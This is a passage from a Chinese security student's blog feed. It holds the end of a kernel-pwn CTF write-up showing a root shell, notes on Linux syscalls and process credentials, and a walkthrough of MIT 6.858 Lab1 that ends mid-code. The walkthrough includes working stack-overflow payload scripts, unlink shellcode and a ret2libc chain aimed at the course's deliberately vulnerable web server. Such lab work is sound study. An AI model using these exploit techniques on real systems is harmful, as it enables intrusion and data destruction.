exploit<br></code></pre></td></tr></table></figure><p>这里不知道为什么我在kali 2023.3上编译出来的<code>exploit</code>，运行的时候<code>getuid()</code>确实变成0了，但是一执行<code>system(&quot;/bin/sh&quot;)</code>就<code>segmentation fault</code>，换到ubuntu20.04就好了😶‍🌫️</p><p>运行之后新启的shell uid为0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ $ <span class="hljs-built_in">id</span><br>uid=1000(chal) gid=1000(chal) <span class="hljs-built_in">groups</span>=1000(chal)<br>/ $ /tmp/exploit <br>[*] Start to exploit...<br>[*] Status has been saved.<br>[+] Successful to get the addr of commit_cread:ffffffffbda9c8e0<br>[+] Successful to get the addr of prepare_kernel_cred:ffffffffbda9cce0<br>[+] Successful to get the root. Execve root shell now...<br>/ <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root)<br></code></pre></td></tr></table></figure><p>第一次做kernel pwn，还有好多好多细节没完全理解😭😭😭</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OS</title>
    <link href="/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/"/>
    <url>/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/</url>
    
    <content type="html"><![CDATA[<h2 id="控制流转移"><a href="#控制流转移" class="headerlink" title="控制流转移"></a>控制流转移</h2><h3 id="用户态到内核态"><a href="#用户态到内核态" class="headerlink" title="用户态到内核态"></a>用户态到内核态</h3><ol><li><p>切换GS段寄存器</p><p>swapgs指令，把GS段寄存器和某个特定位置的值进行交换，保存GS值，同时交换过来的值作为内核态的GS</p></li><li><p>保存用户栈帧信息</p><p>把用户态栈顶记录在<code>CPU独占变量区域里</code>，再把CPU独占区域里记录内核栈顶放入rsp中</p></li><li><p>保存用户态寄存器信息</p><p>把寄存器push到栈上形成一个pt_regs结构体</p></li><li><p>通过汇编指令判断是否为32位，将控制权交给内核</p></li></ol><p>从内核态回到用户态时，依旧用swapgs指令切换GS寄存器，通过syretq或iretq指令让CPU模式回到ring 3，恢复用户态的状态</p><h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>CPU停下工作，执行中断处理程序。</p><p>实模式下，使用中断向量表（interrupt vector table）存放每个中断号对应的处理程序。保护模式引入中断描述符表IDT（Interrupt Descriptor Table）存放门描述符（gate descriptor），而这个IDT的地址存放在IDTR寄存器中。</p><h4 id="门是什么"><a href="#门是什么" class="headerlink" title="门是什么"></a>门是什么</h4><p>gate会在中断前进行检查</p><ol><li>中断门（Interrupt Gate）处理硬中断，进入中断门后IF标志位会被清除，防止中断嵌套。并且中断门只能在内核态下访问（Descriptor Priviledge Level = 0）</li><li>陷阱门（Trap Gate）处理CPU异常，但不会清空IF</li><li>系统门（System Gate）系统调用（Descriptor Priviledge Level = 3）主要用于系统调用</li></ol><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/1.jpg"></p><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><blockquote><p>32位的系统调用参数是ebx，ecx，edx，esi，edi，ebp</p><p>64位还是和普通函数一样</p></blockquote><p>32位的时候，通过int 0x80触发一个软中断进入kernel mode，但是到了64位的时候有了syscall和sysenter指令，内核启动时会将系统调用函数入口（entry_SYSCALL_64）写入MSR寄存器组中，sycall时进入ring0并跳到MSR寄存器所指定的系统调用入口</p><p>因此syscall性能是比int0x80高的</p><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/2.jpg"></p><h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><p>首先，一个进程收到信号，信号会被存储到进程描述符的信号队列中</p><p>当进程被重新调度时，内核检查其信号队列，处理信号。内核会将用户态寄存器push到用户态栈上，形成sigcontext结构体，然后push SIGNALINFO以及指向sigreturn的代码。这些内容构成了<strong>SigreturnFrame</strong>（SROP伪造的就是这个结构体）</p><p>接下来控制被返回到用户态进程，跳转到对应的signal handler函数，完成之后会执行sigreturn（也是一个系统调用）</p><p>又进入了内核态，恢复原有的用户态上下文信息</p><p>控制权返还用户态</p><blockquote><p>虽然信号不是及时处理的，但由于linux进程调度非常频繁，信号能很快被处理</p></blockquote><p><img src="/img/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/3.jpg"></p><h2 id="进程权限"><a href="#进程权限" class="headerlink" title="进程权限"></a>进程权限</h2><p>在linux kernel源码中，<code>include/linux/sched.h</code>中定义了taskt_struct结构体来描述进程，结构体中三个Process credentials描述了进程的权限</p><ol><li><code>ptracer_cred</code> 使用ptrace系统调用跟踪该进程的上级进程的cred（gdb的原理）如果提前占用这个位置就可以反调试</li><li><code>real_cred</code> 客体凭证（objective cred）通常是一个进程启动时具有的权限</li><li><code>cred</code> 主体凭证（subjective cred）该进程的有效cred，kernel以此作为进程权限的凭证</li></ol><p>这三个都是一个cred结构体的指针，在cred结构体中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-type">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-type">void</span>        *put_addr;<br>    <span class="hljs-type">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC    0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD    0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">kuid_t</span>        uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>        gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>        suid;        <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>        sgid;        <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>        euid;        <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-type">kgid_t</span>        egid;        <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-type">kuid_t</span>        fsuid;        <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-type">kgid_t</span>        fsgid;        <span class="hljs-comment">/* GID for VFS ops */</span><br>    <span class="hljs-type">unsigned</span>    securebits;    <span class="hljs-comment">/* SUID-less security management */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_permitted;    <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_effective;    <span class="hljs-comment">/* caps we can actually use */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_bset;    <span class="hljs-comment">/* capability bounding set */</span><br>    <span class="hljs-type">kernel_cap_t</span>    cap_ambient;    <span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>    jit_keyring;    <span class="hljs-comment">/* default keyring to attach requested</span><br><span class="hljs-comment">                     * keys to */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">session_keyring</span>;</span> <span class="hljs-comment">/* keyring inherited over fork */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">process_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this process */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">thread_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this thread */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>    *<span class="hljs-title">request_key_auth</span>;</span> <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br>    <span class="hljs-type">void</span>        *security;    <span class="hljs-comment">/* subjective LSM security */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span>    <span class="hljs-comment">/* real user ID subscription */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> *<span class="hljs-title">user_ns</span>;</span> <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group_info</span> *<span class="hljs-title">group_info</span>;</span>    <span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br>    <span class="hljs-comment">/* RCU deletion */</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">int</span> non_rcu;            <span class="hljs-comment">/* Can we skip RCU deletion? */</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span>    <span class="hljs-title">rcu</span>;</span>        <span class="hljs-comment">/* RCU deletion hook */</span><br>    &#125;;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>copy过来的，但不是很理解（</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">一个cred结构体中记载了一个进程四种不同的用户ID：<br><br>真实用户ID（real <span class="hljs-built_in">UID</span>）：标识一个进程启动时的用户ID<br>保存用户ID（saved <span class="hljs-built_in">UID</span>）：标识一个进程最初的有效用户ID<br>有效用户ID（effective <span class="hljs-built_in">UID</span>）：标识一个进程正在运行时所属的用户ID，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限<br>文件系统用户ID（<span class="hljs-built_in">UID</span> <span class="hljs-keyword">for</span> VFS ops）：标识一个进程创建文件时进行标识的用户ID<br>在通常情况下这几个ID应当都是相同的<br><br>用户组ID同样分为四个：真实组ID、保存组ID、有效组ID、文件系统组ID<br></code></pre></td></tr></table></figure><h3 id="进程权限改变"><a href="#进程权限改变" class="headerlink" title="进程权限改变"></a>进程权限改变</h3><p>kernel/cred.c中</p><p><code>cred* prepare_kernel_cred(struct task_struct* daemon)</code>可以拷贝一个进程的cred进程的结构体，返回一个新的结构体</p><p><code>int commit_creds(struct cred *new)</code>将一个新的cred结构体应用到进程</p><h2 id="LKMs"><a href="#LKMs" class="headerlink" title="LKMs"></a>LKMs</h2><p>Loadable Kernel Modules</p><p>lsmod查看所有的LKMs</p><p>insmod/remod 装载/溢出LKM</p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>乱七八糟的知识</title>
    <link href="/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E7%9F%A5%E8%AF%86/"/>
    <url>/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><h3 id="ROM和RAM"><a href="#ROM和RAM" class="headerlink" title="ROM和RAM"></a>ROM和RAM</h3><p>RAM（Random Access Memory）</p><p>ROM（Read Only Memory）</p><p>只不过是早期ROM因为技术原因是无法擦除的，出厂之后只能读不能写，因此叫这个名字。后来除了EPROM和EEPROM，可以擦写了，但是还是从ROM技术上衍变出来的，名字还叫ROM。</p>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mit6858 Lab1</title>
    <link href="/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858Lab1/"/>
    <url>/2023/12/06/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/mit6858Lab1/</url>
    
    <content type="html"><![CDATA[<h2 id="mit-系统安全实验Lab1"><a href="#mit-系统安全实验Lab1" class="headerlink" title="mit 系统安全实验Lab1"></a>mit 系统安全实验Lab1</h2><p>参考自<a href="https://arttnba3.cn/2022/12/25/EXPR-0X01-MIT_6_858/">arttnba3大佬的博客</a>🐤</p><p>地址 <a href="https://css.csail.mit.edu/6.858/2022/labs/lab1.html%EF%BC%88Lab1%E7%94%A8%E7%9A%842022%E5%B9%B4%E7%9A%84%E5%AE%9E%E9%AA%8C%EF%BC%89">https://css.csail.mit.edu/6.858/2022/labs/lab1.html（Lab1用的2022年的实验）</a></p><p>给了一个虚拟机<a href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">ubuntu 21.10</a>的vmdk，安装完之后是一个tty，发现没有net-tools，也不能从虚拟机外复制进来内容，去学习了一下发现<code>ip addr</code>也可以查看ip，不过这个输出有点多，这个虚拟机终端也没法往上滚动，加了一个grep 192.168就好了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~$ ip addr | grep 192.168<br>    inet 192.168.71.138/24 brd 192.168.71.255 scope global dynamic eth0<br></code></pre></td></tr></table></figure><p>然后就可以ssh了</p><p>但是ubuntu21.10已经没法apt install了（</p><p>实验的内容在<code>git clone https://web.mit.edu/6858/2022/lab.git </code></p><h3 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h3><p>按照说明，首先make一下，然后运行<code>./clean-env.sh ./zookd 8080</code></p><blockquote><p>这里有个很玄学的问题是，我在物理机上clone下来lab，再用vscode传虚拟机，不光程序运行起来访问不到网页，make的时候也有警告。在虚拟机里clone下来的就什么问题都没有😶‍🌫️</p></blockquote><p>然后可以访问到网页，是一个登陆界面</p><h4 id="lab1-exercise-1-2"><a href="#lab1-exercise-1-2" class="headerlink" title="lab1 exercise 1 + 2"></a>lab1 exercise 1 + 2</h4><p>exercise1 让在<code>zookd.c</code>和<code>http.c</code>找漏洞</p><p>main函数在zookd.c中下面解释各个函数干了什么</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">main : 传入参数port 调用run<span class="hljs-constructor">_server(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span><br>run_server : 通过start<span class="hljs-constructor">_server(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span>初始化socket，<br>             然后一个死循环，对每个accept fork出一个线程，执行process<span class="hljs-constructor">_client(<span class="hljs-params">zookd</span>.<span class="hljs-params">c</span>)</span><br>process_client : <br>    <span class="hljs-number">1.</span> http_request_line (http.c) : 处理请求包的第一行，即<span class="hljs-string">&quot;GET /foo.html HTTP/1.0&quot;</span>这种<br>    <span class="hljs-number">2.</span> http_request_headers (http.c) : 一个死循环处理从第二行开始的所有内容，存在栈溢出。<br>       accept来的buf<span class="hljs-literal">[<span class="hljs-number">8192</span>]</span>进行了防溢出处理，但是value和envvar长度只有<span class="hljs-number">512</span>，可以溢出<br>       每一对envvar和value形成了键值对，存储到了环境变量里<br>    <span class="hljs-number">3.</span> http_serve (http.c) : 后面再说<br></code></pre></td></tr></table></figure><p>exercise2 只说要让程序崩溃就行，不用劫持控制流，那直接发送一个大的包过去就完了。要求写一个<code>exploit-2.py</code>的脚本，在lab文件夹里有给好的模板<code>exploit-template.py</code>，改一下<code>build_exploit</code>就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    req =   <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span> + \<br>            <span class="hljs-string">b&quot;hack: &quot;</span> + <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">8100</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure><p>观察程序报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ ./clean-env.sh ./zookd 8080<br><span class="hljs-built_in">exec</span> <span class="hljs-built_in">env</span> - PWD=/home/student/lab SHLVL=0 setarch x86_64 -R ./zookd 8080<br>Child process 9738 terminated incorrectly, receiving signal 11<br></code></pre></td></tr></table></figure><p>执行检查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ make check-crash<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-crash.sh zookd-exstack ./exploit-2.py<br>10453 --- SIGSEGV &#123;si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7ffffffff000&#125; ---<br>10453 +++ killed by SIGSEGV (core dumped) +++<br>10416 --- SIGCHLD &#123;si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=10453, si_uid=1000, si_status=SIGSEGV, si_utime=0, si_stime=52&#125; ---<br>PASS ./exploit-2.py<br></code></pre></td></tr></table></figure><h4 id="lab1-exercise-3"><a href="#lab1-exercise-3" class="headerlink" title="lab1 exercise 3"></a>lab1 exercise 3</h4><p>lab里给了一个shellcode.S，在make时会编译成shellcode.bin，可以用<code>./run-shellcode shellcode.bin</code>来执行这个程序。</p><p>原本是execve(“/bin/sh”)，exercise3 要求把它改成删除<code>grades.txt</code>。给的shellcode.S是AT&amp;T汇编，抄的大佬的代码😭😭😭😭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globl main<br>.typemain, @function<br><br>main:<br>/* store the string on the stack */<br>xorq  %rax, %rax<br>pushq %rax<br>movq  $0x7478742e73656461, %rax /* &quot;ades.txt&quot; */<br>pushq %rax<br>movq  $0x72672f746e656475, %rax /* &quot;udent/gr&quot; */<br>pushq %rax<br>movq  $0x74732f656d6f682f, %rax /* &quot;/home/st&quot; */<br>pushq %rax<br><br>/* unlink(rsp) */<br>movq  %rsp, %rdi<br>movq  $87, %rax /* SYS_unlink */<br>syscall<br><br>/* exit() */      不加exit会报个segmentation fault，但是也能执行<br>xorq  %rdi, %rdi<br>movq  $60, %rax/* SYS_exit */<br>syscall<br></code></pre></td></tr></table></figure><h4 id="lab1-exercise-4"><a href="#lab1-exercise-4" class="headerlink" title="lab1 exercise 4"></a>lab1 exercise 4</h4><p>exercise2 的栈溢出注入shellcode，执行的程序换了一下，换成没开NX的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./clean-env.sh ./zookd-exstack 8080<br></code></pre></td></tr></table></figure><blockquote><p>在url_decode函数里，当sp字符串里看到了\x00字符，就会终止向valuie里复制字符串，但是又有把%加两个digit转换为数字的case，因此payload要<code>.replace(&quot;\x00,%00&quot;)</code>再发送。</p></blockquote><p>接下来就是寻找字符串的位置和返回地址的位置，虽然<code>value</code>和<code>envvar</code>看上去都可以，但是显然value更简单一点，有两种方法：</p><p>第一种：反正有源码，直接print出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value addr : %p\n&quot;</span>, &amp;value);<br><span class="hljs-type">void</span> *stackAddress;<br>__asm__(<span class="hljs-string">&quot;movq %%rbp, %0&quot;</span> : <span class="hljs-string">&quot;=r&quot;</span> (stackAddress));<br>stackAddress = (<span class="hljs-type">void</span>*)((<span class="hljs-type">char</span>*)stackAddress + <span class="hljs-number">8</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Return Address Stack Address: %p\n&quot;</span>, stackAddress);<br></code></pre></td></tr></table></figure><p>第二种：调试，gdb -p $(pgrep zookd-)<code>，下断点</code>b http.c:xxx<code>，查看变量地址</code>print &amp;value`，拿到shellcode地址，再用rbp+8拿到返回地址（或者info frame）</p><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    req = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span class="hljs-string">b&quot;hack: &quot;</span><br>    req += (<br>        shellcode + <span class="hljs-string">b&quot;A&quot;</span> * ((stack_retaddr - stack_buffer) - <span class="hljs-built_in">len</span>(shellcode)) +  p64(stack_buffer)<br>    ).replace(<span class="hljs-string">b&quot;\x00&quot;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span> <br>    req += <span class="hljs-string">b&quot;\r\n&quot;</span> <span class="hljs-comment"># 注意这里额外的一行</span><br>    <span class="hljs-keyword">return</span> req<br></code></pre></td></tr></table></figure><p>在<code>http_request_headers</code>的死循环跳出的条件是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>因此想要跳出循环，必须最后要有一个空行！！！！！！！😭😭😭😭😭😭😭😭😭😭😭😭</p><p>我在这卡了一下午，一直以为是我的栈地址不对😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭</p><p>再学习一下大佬的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(<span class="hljs-string">&#x27;nop&#x27;</span>) * <span class="hljs-number">4096</span> + asm(shellcode_text)<br>payload = (p64(<span class="hljs-number">0x7fffffffe000</span>) * <span class="hljs-number">128</span> + shellcode).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;%00&#x27;</span>)<br>req  = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>req += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + payload + <span class="hljs-string">b&quot;\r\n&quot;</span><br>req += <span class="hljs-string">b&quot;\r\n&quot;</span><br></code></pre></td></tr></table></figure><p>只要返回地址能够命中4096个nop中的任何一个，就能执行处后面的shellcode（但是这个地址又是去哪看的呢😶‍🌫️</p><p>执行检查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">student@6858-v22:~/lab$ <span class="hljs-built_in">chmod</span> +x ./exploit-4.py <br>student@6858-v22:~/lab$ make check-exstack<br>./check-bin.sh<br>WARNING: bin.tar.gz might not have been built this year (2023);<br>WARNING: <span class="hljs-keyword">if</span> 2023 is correct, ask course staff to rebuild bin.tar.gz.<br>tar xf bin.tar.gz<br>./check-attack.sh zookd-exstack ./exploit-4.py<br>PASS ./exploit-4.py<br></code></pre></td></tr></table></figure><h4 id="lab1-exercise5"><a href="#lab1-exercise5" class="headerlink" title="lab1 exercise5"></a>lab1 exercise5</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./clean-env.sh ./zookd-exstack 8080<br></code></pre></td></tr></table></figure><p>开了nx，ret2libc。这道题要从<code>/proc/&lt;pid&gt;/maps</code>查看libc被加载到哪（其实都已经gdb了，直接<code>p 某个函数</code>，再减去<code>libc.sym[&#39;xxx&#39;]</code>得到的也一样</p><blockquote><p>在gdb里也可以<code>shell cat /proc/&lt;pid&gt;/maps</code></p></blockquote><p>栈地址和之前是一样的，把字符串放在value上，然后在libc里找<code>pop rdi; ret</code>就行了。exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">stack_buffer = <span class="hljs-number">0x7fffffffda50</span><br>stack_retaddr = <span class="hljs-number">0x7fffffffdc88</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_exploit</span>(<span class="hljs-params">shellcode</span>):<br>    libc_base = <span class="hljs-number">0x1555552e8000</span><br>    libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    unlink = libc_base + libc.sym[<span class="hljs-string">&quot;unlink&quot;</span>]<br>    pop_rdi = libc_base + <span class="hljs-number">0x2e6c5</span> <span class="hljs-comment">#  pop rdi ; ret</span><br><br>    payload = <span class="hljs-string">b&quot;/home/student/grades.txt\x00&quot;</span> <br>    payload += <span class="hljs-string">b&#x27;A&#x27;</span> * (stack_retaddr - stack_buffer - <span class="hljs-built_in">len</span>(payload)) <br>    payload += p64(pop_rdi) + p64(stack_buffer) + p64(unlink)<br><br>    req = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    req += <span 